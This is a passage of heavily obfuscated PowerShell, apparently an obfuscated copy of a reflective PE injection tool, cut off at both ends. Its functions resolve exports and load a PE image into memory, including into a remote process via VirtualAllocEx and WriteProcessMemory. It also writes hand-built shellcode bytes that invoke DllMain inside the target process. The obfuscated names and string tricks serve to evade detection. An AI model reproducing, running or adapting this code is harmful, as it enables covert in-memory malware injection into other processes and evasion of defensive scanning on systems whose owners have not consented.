			${WiN3`2f`U`NCt`IOnS}."VIr`TUA`lPro`Tect"."inv`okE"(${PRoc`E`Xit`FUNCt`IO`NAddr}, [UInt32]${toT`Als`IZE}, [UInt32]${oLdpr`o`TEcTf`LAG}, [Ref]${OlDProtE`Ctf`lAG}) | &("{1}{0}"-f '-Null','Out')
		}
		

		&("{0}{3}{1}{2}"-f'Writ','tp','ut','e-Ou') ${REtu`Rna`Rr`AY}
	}
	
	
	
	
	Function coP`Y-ARr`A`y`ofmEmaddrESsEs
	{
		Param(
		[Parameter(pOSItiOn = 0, MAndaToRY = ${tR`UE})]
		[Array[]]
		${c`O`PYInFo},
		
		[Parameter(pOSITiOn = 1, MANDATorY = ${Tr`Ue})]
		[System.Object]
		${win`32`FU`NctiOnS},
		
		[Parameter(poSItIOn = 2, ManDAToRY = ${tr`Ue})]
		[System.Object]
		${wIN32`Co`Nstan`Ts}
		)

		[UInt32]${o`ldP`RotECtF`Lag} = 0
		foreach (${i`Nfo} in ${c`OpYi`NfO})
		{
			${SuCC`Ess} = ${wi`N`32fuNCtIonS}."v`irt`UA`lPrO`TeCt"."I`N`VoKe"(${IN`FO}[0], [UInt32]${in`FO}[2], [UInt32]${win`32`con`st`AnTs}."PAge_Ex`E`C`Ut`E_REAdWrI`Te", [Ref]${OLDprO`T`eC`Tflag})
			if (${SU`cC`ESs} -eq ${Fa`LSE})
			{
				Throw ("{0}{1}{4}{2}{3}"-f'C','all t','irtualProtect ','failed','o V')
			}
			
			${win`32fU`Nct`ions}."MeM`cpY"."iNV`OKE"(${I`NFO}[0], ${IN`FO}[1], [UInt64]${In`FO}[2]) | &("{1}{0}"-f 't-Null','Ou')
			
			${w`I`N32fUncT`ioNs}."vIR`TUALPROT`e`CT"."in`V`OkE"(${In`Fo}[0], [UInt32]${In`Fo}[2], [UInt32]${OLdp`RO`TEctfl`Ag}, [Ref]${Old`p`ROTeCTFLag}) | &("{2}{1}{0}"-f'l','ut-Nul','O')
		}
	}


	
	
	
	Function get`-`Mem`OryPrO`caDdR`E`sS
	{
		Param(
		[Parameter(pOsItION = 0, mANdAtOrY = ${tR`Ue})]
		[IntPtr]
		${p`EhAn`DLE},
		
		[Parameter(pOSItiON = 1, maNdatorY = ${Tr`Ue})]
		[String]
		${fU`N`ction`NaMe}
		)
		
		${W`iN3`2TypES} = &("{2}{3}{1}{0}" -f 'es','Typ','Get-Win','32')
		${W`i`N32C`ONS`TANtS} = &("{3}{0}{2}{1}"-f't-Win32C','ts','onstan','Ge')
		${p`eIn`FO} = &("{3}{5}{1}{4}{2}{0}"-f 'dInfo','-P','taile','Ge','EDe','t') -PEHandle ${p`eH`AnDLe} -Win32Types ${Wi`N3`2TYpeS} -Win32Constants ${w`IN`32CONSt`AN`Ts}
		
		
		if (${P`eINFO}."imagE_`N`T_He`AderS"."OPTiOn`Al`HeA`DEr"."E`x`PorTTa`BLE"."s`iZe" -eq 0)
		{
			return  ( &('Gi')  ('V'+'A'+'RI'+'aBLe:2M1A'+'j') )."VA`luE"::"z`Ero"
		}
		${e`xpO`RttABL`E`PtR} = &("{0}{1}{6}{4}{3}{2}{5}"-f 'Add','-Sig','ne','sig','AsUn','d','nedInt') (${pe`HANd`Le}) (${p`EIN`FO}."imag`E_n`T_Head`E`RS"."o`P`TIona`LHea`dER"."Ex`P`Ortt`ABLe"."vIRTU`AL`AdDResS")
		${ex`PoRTt`A`Ble} =   ${6`9pB}::"pTr`TOSTRuC`TUre"(${ExPorT`TabL`e`P`Tr}, [Type]${wI`N32TyP`es}."imaGe_ExPo`R`T_di`Re`CtO`Ry")
		
		for (${i} = 0; ${i} -lt ${eXpO`Rt`TAb`Le}."nU`mB`ErOFnaM`es"; ${I}++)
		{
			
			${NAMEoFfS`E`T`p`Tr} = &("{5}{2}{3}{0}{4}{1}" -f'As','d','Sign','edInt','Unsigne','Add-') (${pEh`A`NDLE}) (${exPo`R`TTABLE}."aDDReSsO`Fnam`ES" + (${I} *  (  &("{1}{0}{2}" -f 'riaB','geT-vA','le')  69PB -Val )::"sIze`of"([Type][UInt32])))
			${N`A`MEptR} = &("{4}{2}{3}{0}{1}"-f'si','gned','SignedIn','tAsUn','Add-') (${PE`HANd`Le}) ( (&("{0}{1}{2}"-f 'V','AR','IABLE') ('69'+'PB')  )."Va`lUe"::"ptr`TOSTru`ctu`Re"(${nA`me`ofFsE`TP`TR}, [Type][UInt32]))
			${n`Ame} =  ${6`9Pb}::("{3}{1}{2}{0}" -f 'Ansi','trin','g','PtrToS').Invoke(${NA`MEp`TR})

			if (${n`AmE} -ceq ${Funct`IOnNA`ME})
			{
				
				
				${oRDin`A`lp`TR} = &("{1}{4}{2}{3}{0}"-f 'gned','A','gnedI','ntAsUnsi','dd-Si') (${P`eha`NDLe}) (${eXpOrt`T`A`Ble}."A`d`Dr`eSsOf`NaMeorDiN`ALS" + (${i} *   (  &("{2}{1}{3}{0}"-f'ARiaBle','T','ge','-v')  ("69P"+"b"))."vAl`Ue"::"SizE`Of"([Type][UInt16])))
				${F`U`NcinDEx} =  ${69`pB}::"PTrtOstr`UCt`U`RE"(${O`Rdi`NAl`PTr}, [Type][UInt16])
				${fun`C`OFfs`e`TaDdr} = &("{0}{2}{4}{5}{3}{1}"-f'Add-','d','SignedIn','ne','tAs','Unsig') (${Pe`HAndlE}) (${E`XpoRt`T`AblE}."aD`d`R`ESsoffUNCtiO`Ns" + (${F`UNCi`N`Dex} *   (  &("{1}{2}{0}{3}"-f '-cHILDIte','g','eT','M')  ("Va"+"Ria"+"Ble:69pB") )."VA`Lue"::"S`izeof"([Type][UInt32])))
				${f`UncOfFS`et} =   (  &("{2}{0}{1}"-f 'Varia','bLe','get-') 69PB )."v`AlUe"::"PtrtO`Str`UCt`U`RE"(${fU`NC`offSE`TAdDr}, [Type][UInt32])
				return &("{1}{5}{0}{6}{2}{4}{3}"-f'gnedI','A','s','igned','Uns','dd-Si','ntA') (${p`EhAN`dlE}) (${f`U`NCOfF`SET})
			}
		}
		
		return  ( &("{1}{0}" -f'CI','G') ('VaRiAbLE:2m1'+'a'+'J'))."V`AlUE"::"Z`ERo"
	}


	Function In`VO`Ke`-Me`MoRY`loa`DliBrAry
	{
		Param(
		[Parameter( posITIOn = 0, MandaTORy = ${Tr`Ue} )]
		[Byte[]]
		${P`eBY`TES},
		
		[Parameter(POsITIOn = 1, ManDAtORY = ${FAl`Se})]
		[String]
		${EX`ear`GS},
		
		[Parameter(pOSITIoN = 2, MAndAtorY = ${fA`l`SE})]
		[IntPtr]
		${rEmo`TEP`ROcH`ANdLE},

        [Parameter(PosItIOn = 3)]
        [Bool]
        ${FOr`cEa`SlR} = ${F`A`LSE}
		)
		
		${pt`RsiZE} =   ${6`9Pb}::"s`IZEoF"([Type][IntPtr])
		
		
		${wi`N32c`on`STa`NtS} = &("{1}{0}{3}{2}{4}"-f't-Win','Ge','on','32C','stants')
		${Win`32`FUnC`TiOns} = &("{2}{0}{1}{3}"-f'2Fu','n','Get-Win3','ctions')
		${WI`N3`2t`YPeS} = &("{2}{0}{4}{3}{1}"-f't-Wi','2Types','Ge','3','n')
		
		${r`E`MO`T`elOaDINg} = ${fa`lSE}
		if ((${re`m`OTePrOchAnd`Le} -ne ${nu`LL}) -and (${r`em`oTEProC`HAn`DLe} -ne  (&("{1}{0}" -f'TEm','i')  ("VAriA"+"B"+"lE:2M1aj") )."VA`LUE"::"z`ERO"))
		{
			${rE`moTe`l`O`ADINg} = ${tr`Ue}
		}
		
		
		&("{3}{1}{0}{4}{2}" -f'e','rit','bose','W','-Ver') ("{11}{9}{7}{3}{5}{0}{4}{1}{2}{8}{6}{10}" -f ' inf','ion fr','om',' basi','ormat','c PE','fi','tting',' the ','e','le','G')
		${p`EI`NFO} = &("{1}{3}{2}{0}" -f'asicInfo','Get-','B','PE') -PEBytes ${p`EB`Ytes} -Win32Types ${W`In3`2TYp`eS}
		${O`R`IgINa`lIMAGeba`sE} = ${pE`i`NFo}."ORIgIN`AL`i`mageB`ASe"
		${NXC`omPA`TiBle} = ${T`Rue}
		if (([Int] ${Pe`iNFo}."dlLC`Har`A`CTeR`iS`TIcs" -band ${wiN32C`On`s`TaNtS}."IM`AGe_`dllcHaRaCteRiStIcS`_nx`_COMP`AT") -ne ${wIN`32`COns`TAnTS}."i`mAge_d`llCH`ARA`C`TE`RiSTICs_NX_C`oM`Pat")
		{
			&("{2}{1}{0}" -f'ng','e-Warni','Writ') ("{0}{3}{7}{5}{6}{1}{4}{2}" -f'PE is',', might caus','ssues',' not compa','e i',' with ','DEP','tible') -WarningAction ("{2}{0}{1}"-f'on','tinue','C')
			${NXc`OMpATiB`lE} = ${f`AL`Se}
		}
		
		
		
		${PRoCess`6`4`BiT} = ${T`Rue}
		if (${R`EmoTE`L`o`AdInG} -eq ${T`RUe})
		{
			${k`ErNEl`32H`ANDLE} = ${win32Fu`NC`TiONS}."ge`T`MOdUlEhaNd`lE"."I`Nvoke"(("{1}{2}{3}{0}" -f '32.dll','k','er','nel'))
			${R`E`sUlt} = ${wIn`3`2f`UnCtI`ONs}."GeTP`R`ocAdDR`e`ss"."i`NvokE"(${KeRNe`l32`hA`Ndle}, ("{1}{2}{0}{3}"-f '4Proces','IsWo','w6','s'))
			if (${r`esu`Lt} -eq  (  &('GI') ('VARIAbLE'+':2M'+'1a'+'J') )."vaL`Ue"::"ze`RO")
			{
				Throw ((("{14}{4}{9}{15}{13}{5}{1}{11}{8}{0}{12}{2}{6}{3}{7}{10}"-f ' d','oce','ermi','ss is','n{0','64Pr','ne if target proce',' 32bit','s function to','}t ',' or 64bit','s','et','IsWow','Could','locate ')) -F[ChAR]39)
			}
			
			[Bool]${wO`W`64proc`Ess} = ${FA`l`se}
			${sU`cC`ESs} = ${wi`N`3`2FUNct`IoNS}."I`SWoW64pRo`C`E`ss"."InV`Oke"(${r`EmO`TeprochA`ND`lE}, [Ref]${Wow64Pr`oC`ESS})
			if (${SUccE`SS} -eq ${f`AL`sE})
			{
				Throw ("{3}{7}{5}{6}{4}{2}{8}{1}{0}" -f'cess failed','ro','4','Ca','sWow6',' to ','I','ll','P')
			}
			
			if ((${w`o`W64`P`Rocess} -eq ${TR`Ue}) -or ((${wOW64`PrO`cE`Ss} -eq ${fa`L`se}) -and ( (&("{1}{0}"-f'rIaBlE','Va') 69pb )."VAl`Ue"::"sizE`of"([Type][IntPtr]) -eq 4)))
			{
				${p`ROcE`Ss64`B`iT} = ${FAL`se}
			}
			
			
			${p`o`wers`heLL64`Bit} = ${tR`UE}
			if ( (&("{0}{1}" -f'dI','R')  ('VARi'+'aBle:69P'+'b') )."vA`lUe"::"SI`z`EOF"([Type][IntPtr]) -ne 8)
			{
				${Po`We`RS`heLl`64BiT} = ${f`AL`sE}
			}
			if (${Po`wE`RsH`ell`64BIt} -ne ${pr`O`cES`s64BiT})
			{
				throw ("{15}{7}{9}{5}{3}{8}{11}{2}{1}{17}{16}{12}{13}{10}{6}{0}{4}{14}" -f 'p',' (x86/x64) ','ure','same arc','roces',' ','d remote ','owerShell mu','hite','st be','ed an','ct','e','ing load','s','P','E b','as P')
			}
		}
		else
		{
			if ( ( &('GI') ("{2}{0}{1}{3}"-f 'RI','aBLe:6','vA','9Pb')  )."V`ALuE"::"s`iZEof"([Type][IntPtr]) -ne 8)
			{
				${prOc`es`s64biT} = ${f`AlSe}
			}
		}
		if (${PR`Oc`ESs64BIt} -ne ${p`eInfO}."PE6`4b`It")
		{
			Throw ((("{8}{9}{2}{15}{16}{10}{12}{1}{14}{17}{11}{5}{4}{3}{13}{0}{6}{7}" -f'd in (32',' ','sn{0}t matc','s b','s it i','s','/6','4bit)','PE platfor','m doe','ture o','e','f','eing loade','the p','h the archi','tec','roc'))  -f  [cHar]39)
		}
		

		
		&("{0}{1}{2}" -f'Wr','ite-Verb','ose') ("{1}{6}{4}{8}{5}{10}{3}{11}{0}{7}{2}{14}{12}{13}{9}"-f'ri','Al',' ','nd ','oc','ory ','l','te','ating mem','mory','for the PE a','w','s headers ','to me','it')
		
        
		[IntPtr]${Loa`d`ADDR} =  (  &("{2}{3}{1}{0}" -f 'Em','dIt','Get-','CHIL')  ("{2}{3}{1}{0}"-f 'Aj','m1','VARI','aBlE:2') )."v`ALUE"::"ze`Ro"
        ${P`Es`UPp`ORTSAs`LR} = ([Int] ${pE`I`NFo}."DLL`CH`ArA`CTERIs`TicS" -band ${WiN32`CONsTA`N`TS}."iM`A`ge_D`ll`char`ACT`e`RiS`TIcS_d`YNamiC_Ba`Se") -eq ${Win3`2cOns`Ta`N`Ts}."I`m`AgE_dlLch`ARA`CTERIs`T`ICs_dY`NaMI`c_BasE"
		
		
		
		
		
		
		
        
        
        
		
        

		
        if (${f`oR`ceaSLR} -and ${RE`Mo`TELO`Ading})
        {
            &("{2}{0}{1}"-f'rr','or','Write-E') ("{16}{11}{2}{1}{0}{12}{6}{17}{4}{10}{13}{3}{8}{7}{15}{5}{9}{14}"-f 'e','s','t u','oading ','eASLR ','emo','For',' a','in to','te p','when','anno',' ',' l','rocess.',' r','C','c') -ErrorAction ("{0}{1}" -f 'St','op')
        }
        if (${rem`o`TeLoAd`I`NG} -and (-not ${P`Es`UPpoRTs`ASLr}))
        {
            &("{1}{2}{0}"-f'te-Error','Wr','i') ((("{1}{5}{14}{13}{10}{4}{0}{7}{6}{8}{12}{9}{2}{11}{3}" -f'a no','PE ','e pro','ss',' ASLR. Cannot load ','d',' ','n-ASLR PE in','to','t','Smt support','ce',' a remo','0','oesn'))  -REplACE ([CHaR]48+[CHaR]83+[CHaR]109),[CHaR]39) -ErrorAction ("{1}{0}"-f'p','Sto')
        }
		

		${P`E`handLe} =   ${2`M1aj}::"z`ERo"				
		${EFFe`cTi`V`e`peH`ANdlE} =  ( &('GI')  ("V"+"arIAB"+"lE:2m1aj"))."v`ALuE"::"zE`Ro"		
		if (${r`E`MoT`ElOADING} -eq ${tR`UE})
		{
			
			${p`ehaNd`lE} = ${W`I`N`32`FUNcTIons}."VI`RTualal`L`Oc"."I`NvO`kE"(  ${2`m1aj}::"Z`ERo", [UIntPtr]${PEi`NFo}."s`iz`eofima`GE", ${w`IN32cONs`T`AnTs}."ME`m_com`mit" -bor ${wIn`3`2C`oNs`TanTs}."meM`_`REsE`RVe", ${WI`N32c`onST`ANtS}."p`AGe_rEADw`Ri`Te")
			
			
			${efFEcT`Iv`e`peHa`NDLe} = ${WIn`32F`Un`CtI`ons}."vi`RTU`AlA`LloceX"."in`V`Oke"(${reMotE`pRoCh`A`N`dle}, ${l`OaDAddr}, [UIntPtr]${PeIN`FO}."s`izeOfi`MAGE", ${W`in`32con`STa`Nts}."MEm_cOm`m`It" -bor ${WIN3`2CoNSt`A`NTS}."mE`M`_RES`eRve", ${wiN32co`N`s`TAntS}."PAg`E_`ex`E`Cu`TE_re`AdwrIte")
			if (${EffeCt`i`V`EPeHANdle} -eq  ${2M`1Aj}::"z`ERO")
			{
				Throw ((("{0}{17}{1}{10}{26}{6}{24}{12}{18}{3}{25}{16}{27}{19}{7}{11}{2}{28}{9}{13}{21}{4}{15}{14}{22}{8}{20}{5}{23}"-f'Unab','allocat','oaded d','e re',' o',' in u','ry','he PE bein','r','snA0Dt support ASLR, it could b','e','g l',' ','e that the requested ba','E is a','f the P','e','le to ','th','t','eady','se address','l','se',' in','mot',' memo',' process. If ','oe'))-rEpLaCe 'A0D',[cHAR]39)
			}
		}
		else
		{
			if (${NXc`O`MpAT`ib`le} -eq ${t`RuE})
			{
		
				${PE`HanD`LE} = ${Wi`N32fu`NCTIONs}."VirTu`AlAl`loC"."INV`OKE"(${L`oA`DadDr}, [UIntPtr]${pEIn`Fo}."Si`zEOfi`Ma`gE", ${Win`3`2C`o`NStaNtS}."MEM_c`oM`MiT" -bor ${W`i`N32CO`NS`TANTs}."MEm_R`ESE`Rve", ${WI`N32C`oNS`TaNts}."Page`_`ReADWrI`TE")
			}
			else
			{
				${IMAge`Ba`sE`TYPe} = ${ORi`GINaLImage`B`A`Se}.("{1}{0}{2}"-f'Typ','Get','e').Invoke();
				${peH`ANDle} = ${W`In32FU`N`c`TIOnS}."V`irTua`LALloc"."iNVo`kE"(${LO`A`daddR}, [UIntPtr]${PEiN`FO}."sIZE`oFIMA`GE", ${Wi`N3`2co`NStanTS}."M`Em`_coMmiT" -bor ${wi`N3`2consT`AnTS}."me`m`_reSERVe", ${win`32c`onSTA`NTS}."PAge_EXEC`UTE_ReAd`wR`i`Te")
			}
			${ef`FeCtiv`ePE`Ha`N`DLe} = ${PEhaNd`Le}
		}
		
	
		
		[IntPtr]${PEen`dAdDR`ESS} = &("{0}{6}{3}{5}{4}{2}{1}"-f 'Add-Si','d','ne','nedIntA','sig','sUn','g') (${PEh`AnD`LE}) ([Int64]${Pei`N`FO}."sIze`of`im`AGE")
		if (${peH`AN`DLe} -eq   (&("{1}{2}{0}" -f 'le','vAr','iAb') ("2"+"M1aj")  )."VAL`UE"::"zE`RO")
		{ 
			Throw (("{10}{57}{45}{28}{6}{64}{49}{48}{17}{37}{5}{36}{21}{1}{58}{61}{27}{2}{9}{26}{56}{54}{47}{13}{41}{46}{11}{4}{42}{50}{7}{35}{24}{39}{31}{60}{23}{19}{32}{44}{63}{30}{22}{25}{40}{18}{55}{8}{53}{62}{43}{59}{34}{16}{0}{51}{14}{33}{12}{15}{3}{29}{38}{20}{52}"-f'the PE ','E. If PE is',' ','ht','t in a',' f','a','w Po',' the','comp','Vi','scrip','ts ','runn','a','mig',' ','r',',','ll pro','ee)','r P','a','werShe','rShell pr','ve a different m','a','ASLR','Alloc failed to alloc',' be ',' h','ew P','ces','n','s','we','o','y','fr','ocess (the n','emory layout','ing ',' ','e','s','ual','the ',' try ','o',' mem','ne','w','.',' ad',',',' so','tible','rt',' ','s','o','not ','dr',' will','te'))
		}		
		  ( &("{1}{0}"-f 'ABlE','VArI')  69PB -vaLUeOn )::("{0}{1}"-f'Co','py').Invoke(${peBy`TEs}, 0, ${PE`han`D`lE}, ${PE`info}."siZ`eofhEAde`Rs") | &("{0}{1}" -f'Out-','Null')
		
		
		
		&("{4}{0}{3}{2}{1}" -f'rit','se','erbo','e-V','W') ("{1}{2}{10}{7}{5}{4}{8}{9}{3}{6}{0}{11}{13}{12}"-f' t','G','et','tion fro','E ','P','m','g detailed ','inform','a','tin','he h','rs loaded in memory','eade')
		${pEIN`FO} = &("{2}{0}{3}{1}" -f 'e','ailedInfo','G','t-PEDet') -PEHandle ${P`eHA`NdLE} -Win32Types ${Win32`T`y`pes} -Win32Constants ${WIN`32CoNS`T`AnTS}
		${Pei`NFo} | &("{1}{0}{2}"-f 'e','Add-M','mber') -MemberType ("{0}{2}{1}"-f 'NoteProp','ty','er') -Name ("{0}{2}{1}"-f 'En','ss','dAddre') -Value ${P`eENdADDr`e`sS}
		${PeI`N`FO} | &("{0}{1}{2}{3}"-f'A','dd-','M','ember') -MemberType ("{1}{2}{3}{0}" -f'y','N','otePrope','rt') -Name ("{2}{0}{3}{1}"-f 'ectiveP','ndle','Eff','EHa') -Value ${EfF`Ec`TIv`EpehAnDlE}
		&("{2}{1}{0}{3}" -f'te-','i','Wr','Verbose') "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress) "
		
		
		
		&("{3}{0}{2}{1}" -f'o','e','s','Write-Verb') ("{0}{1}{3}{2}{4}"-f 'C','opy PE secti','e','ons in to m','mory')
		&("{1}{0}{2}" -f'ct','Copy-Se','ions') -PEBytes ${pE`B`YTes} -PEInfo ${p`EiN`Fo} -Win32Functions ${W`iN3`2`FUnCTIo`NS} -Win32Types ${wiN32t`y`PEs}
		
		
		
		&("{3}{0}{4}{2}{1}" -f'e','e','Verbos','Writ','-') ("{7}{9}{12}{0}{14}{13}{5}{6}{3}{1}{11}{2}{4}{10}{8}" -f' ','e ','a','n where th','s actually load',' base','d o','Up',' in memory','d','ed','PE w','ate','esses','memory addr')
		&("{1}{0}{3}{2}{4}" -f't','Upda','moryAd','e-Me','dresses') -PEInfo ${P`E`INfO} -OriginalImageBase ${O`R`igInaLIm`AGE`B`AsE} -Win32Constants ${wIn3`2`coNSt`ANTs} -Win32Types ${wiN32`TYp`es}

		
		
		&("{3}{1}{2}{0}{4}" -f'bo','ite-','Ver','Wr','se') ((("{1}{8}{7}{4}{6}{2}{3}{0}{5}{10}{9}" -f' ','I','ded',' by the',' DLL{','P','0}s nee','rt','mpo','e loading','E we ar'))-F  [CHAR]39)
		if (${rEM`ot`ELOadIng} -eq ${T`RuE})
		{
			&("{2}{3}{0}{5}{4}{1}" -f'l','ts','Import','-Dl','por','Im') -PEInfo ${PeiN`Fo} -Win32Functions ${wI`N3`2Fu`NcTI`onS} -Win32Types ${WIn`3`2TY`PES} -Win32Constants ${wIn`32`cONsT`An`TS} -RemoteProcHandle ${REmotE`PrOch`AN`dLE}
		}
		else
		{
			&("{0}{1}{2}{3}{4}"-f 'Imp','ort-','D','l','lImports') -PEInfo ${Pe`i`NfO} -Win32Functions ${WIn32F`Un`CtI`oNS} -Win32Types ${W`in32T`Yp`es} -Win32Constants ${Wi`N32cO`Nst`AnTS}
		}
		

		
		if (${rEmOTE`lo`Ad`InG} -eq ${FAl`SE})
		{
			if (${nXCOm`PaT`Ib`le} -eq ${T`RuE})
			{
				&("{2}{1}{0}" -f'ose','rite-Verb','W') ("{4}{5}{0}{3}{2}{1}"-f'em',' flags','ction','ory prote','Update ','m')
				&("{6}{7}{0}{2}{1}{5}{8}{3}{4}"-f'Pr','tectio','o','a','gs','n','Update-','Memory','Fl') -PEInfo ${P`EIN`FO} -Win32Functions ${wIN32`FuN`cTi`O`NS} -Win32Constants ${WIN3`2coNS`T`A`Nts} -Win32Types ${wiN`32t`ypes}
			}
			else
			{
				&("{2}{3}{0}{4}{1}"-f'Ve','ose','W','rite-','rb') ("{5}{17}{1}{2}{27}{10}{24}{18}{25}{9}{15}{0}{16}{14}{12}{21}{22}{23}{7}{26}{8}{3}{11}{20}{6}{4}{19}{13}"-f'atible w','being reflec','tively lo',' memory ','d w','P','a',',','eping',' com','d','a','X','e execute',' N','p','ith','E ','d ','rit','s re',' ','mem','ory','e','is not',' ke','a')
			}
		}
		else
		{
			&("{1}{2}{0}" -f 'se','Wri','te-Verbo') ("{1}{4}{8}{6}{7}{0}{13}{12}{2}{10}{9}{3}{15}{11}{14}{5}"-f'o','PE ','not a','g mem','being loa','ions','p','r','ded in to a remote ','n','djusti','r','s, ','ces','y permiss','o')
		}
		
		
		
		if (${RE`MOtEl`o`AD`inG} -eq ${t`Rue})
		{
			[UInt32]${NUm`B`yteS`wri`TtEN} = 0
			${sUCC`eSS} = ${wiN3`2`F`U`NctIONs}."wri`TEpR`oc`esSme`MoRY"."inv`OKe"(${reM`OTepROcH`ANd`lE}, ${EFFECT`IVE`pE`HA`NDlE}, ${p`Eh`ANdle}, [UIntPtr](${PeI`N`Fo}."SIzEof`im`AgE"), [Ref]${nUMbYt`ESWr`it`T`EN})
			if (${succ`E`SS} -eq ${f`ALse})
			{
				Throw ("{0}{1}{5}{7}{3}{6}{2}{4}{8}"-f 'Unable to',' wr',' to remote ','o','process mem','ite ','de','shellc','ory.')
			}
		}
		
		
		
		if (${pe`i`Nfo}."FiL`et`ype" -ieq "DLL")
		{
			if (${REm`O`TELOa`d`iNG} -eq ${faL`sE})
			{
				&("{0}{2}{1}"-f'Wr','e-Verbose','it') ("{3}{9}{1}{8}{7}{4}{2}{5}{6}{0}"-f'en loaded','dllma','DL','Call','he ','L knows i','t has be',' t','in so','ing ')
				${D`lLMAi`N`Ptr} = &("{3}{0}{2}{1}" -f 'dd-S','igned','ignedIntAsUns','A') (${Pe`in`FO}."pehA`N`DlE") (${pEIn`Fo}."iM`AGe_`Nt_HeAd`erS"."oPtI`ONaL`Head`ER"."AD`d`ReSSOfEN`TryPoI`NT")
				${DLlmA`I`NDe`Leg`AtE} = &("{4}{2}{3}{0}{1}" -f'T','ype','ga','te','Get-Dele') @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				${dL`LM`Ain} =  ( &("{1}{2}{0}" -f 'iAblE','va','r')  ("69"+"PB")  )."val`Ue"::("{2}{5}{6}{0}{7}{1}{3}{4}"-f 'teForFu','onPoi','GetDele','nte','r','g','a','ncti').Invoke(${dLLm`AI`NptR}, ${dll`m`AInde`l`egATe})
				
				${D`Ll`MAin}."INv`OkE"(${p`eiN`Fo}."p`EHAND`LE", 1,   ${2M`1Aj}::"ZE`RO") | &("{1}{0}{2}"-f 'ut-Nu','O','ll')
			}
			else
			{
				${DLlM`Ain`Ptr} = &("{4}{3}{1}{5}{0}{2}"-f 'U','IntA','nsigned','ned','Add-Sig','s') (${Ef`Fe`Ct`iVePEhAndle}) (${PeI`N`FO}."imAG`E_nt`_HeadeRS"."o`P`T`iONaL`HeADeR"."aDDREs`s`o`FenTRYPO`INT")
			
				if (${p`E`inFO}."pe`64BiT" -eq ${T`Rue})
				{
					
					${ca`L`ldLLm`AIn`SC1} = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					${caLLDlLmai`N`S`c2} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					${c`ALl`Dl`LmAin`sC3} = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					
					${Cal`L`DlLMaI`NS`c1} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					${c`ALldL`lMAI`NSC2} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					${ca`ll`DLlM`AI`NsC3} = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				${scl`e`NgtH} = ${CaL`l`DLLMaIn`SC1}."L`eNg`Th" + ${CaLL`dLlm`A`insc2}."l`e`Ngth" + ${Cal`LdlLmaIn`S`c3}."len`gTH" + (${p`TRsIZe} * 2)
				${sC`PSmeM} =   ${69`pB}::("{1}{0}{2}"-f 'HGloba','Alloc','l').Invoke(${SC`L`EN`GTh})
				${SC`p`S`meM`ORIgIN`Al} = ${sc`PsM`Em}
				
				&("{1}{3}{4}{0}{5}{2}" -f 'tesTo','Write','y','-B','y','Memor') -Bytes ${cal`LDLlm`AINSC1} -MemoryAddress ${ScpS`m`Em}
				${sc`P`smeM} = &("{2}{0}{6}{5}{3}{4}{1}"-f 'dd','igned','A','I','ntAsUns','Signed','-') ${S`cps`mem} (${c`ALLdl`Lm`AiN`sc1}."l`ENGTH")
				 (&("{1}{0}{2}"-f'E','gEt-IT','M')  ("{0}{3}{2}{1}" -f 'vA','9PB','6','RiABLE:') )."V`Alue"::("{0}{3}{2}{1}" -f 'S','tr','eToP','tructur').Invoke(${e`FfECTIvePeha`N`dlE}, ${s`cPS`Mem}, ${F`AL`se})
				${sCpSm`em} = &("{0}{1}{5}{3}{4}{2}{6}"-f'Add-S','i','sig','nedInt','AsUn','g','ned') ${scPS`m`Em} (${pT`Rsize})
				&("{3}{0}{2}{1}" -f 'it','ytesToMemory','e-B','Wr') -Bytes ${c`AlldlL`mA`in`SC2} -MemoryAddress ${scPSM`eM}
				${sCp`SM`Em} = &("{0}{4}{1}{3}{2}" -f 'Add-Si','dIntAs','igned','Uns','gne') ${S`cpsm`eM} (${C`ALLdLLM`A`iNSc2}."lE`N`Gth")
				  ${6`9Pb}::("{2}{0}{3}{1}"-f 'ctur','r','Stru','eToPt').Invoke(${DLL`MAInP`Tr}, ${s`cPsmEM}, ${F`AL`se})
				${sCP`S`mEm} = &("{3}{0}{4}{1}{2}"-f'Sig','Unsi','gned','Add-','nedIntAs') ${s`C`PSMeM} (${P`TrSI`Ze})
				&("{1}{5}{4}{2}{3}{0}"-f 'ry','Writ','sToMem','o','te','e-By') -Bytes ${CAL`lDL`lMai`NSc3} -MemoryAddress ${SCPs`M`EM}
				${sc`Psmem} = &("{3}{1}{4}{0}{5}{2}" -f 'IntAsU','dd','ned','A','-Signed','nsig') ${ScP`SmEM} (${c`AlLD`Llm`Ai`NSC3}."LEnG`TH")
				
				${rsc`A`dDR} = ${WI`N32`FUNCTIonS}."V`IrT`UaLa`llO`cEX"."I`N`VoKe"(${ReMotE`P`RO`CHAnDlE},   ( &("{0}{2}{1}"-f'cHIL','eM','Dit')  ("{2}{3}{4}{0}{1}" -f 'M1A','j','vaR','iaBle',':2'))."va`LUE"::"ze`RO", [UIntPtr][UInt64]${sCLEn`G`TH}, ${w`in32CONst`AN`TS}."ME`m`_CoMMIt" -bor ${wIN32`COnst`A`NTS}."MEm_r`e`s`erVe", ${WI`N32cOnSt`ANTS}."PAge`_EXECutE_`R`ead`wr`ite")
				if (${rSC`Ad`dr} -eq   ${2M`1AJ}::"Ze`Ro")
				{
					Throw ("{2}{11}{5}{1}{9}{0}{10}{3}{4}{12}{13}{7}{6}{8}" -f'h',' i','Unable to allocate m',' remot','e','ry','or sh','f','ellcode','n t','e','emo',' proce','ss ')
				}
				
				${Su`CCeSS} = ${wIn3`2F`U`NctIOnS}."Wri`TEPR`Oc`eSS`meMORy"."I`N`VoKE"(${REmot`ePR`ocha`N`D`le}, ${r`ScadDr}, ${sC`ps`MEmoRIG`InAL}, [UIntPtr][UInt64]${SCLEn`G`Th}, [Ref]${nU`MB`yTES`WRit`TEN})
				if ((${SU`CcESS} -eq ${fal`Se}) -or ([UInt64]${NuM`BYt`eS`WrittEn} -ne [UInt64]${sCl`engTh}))
				{
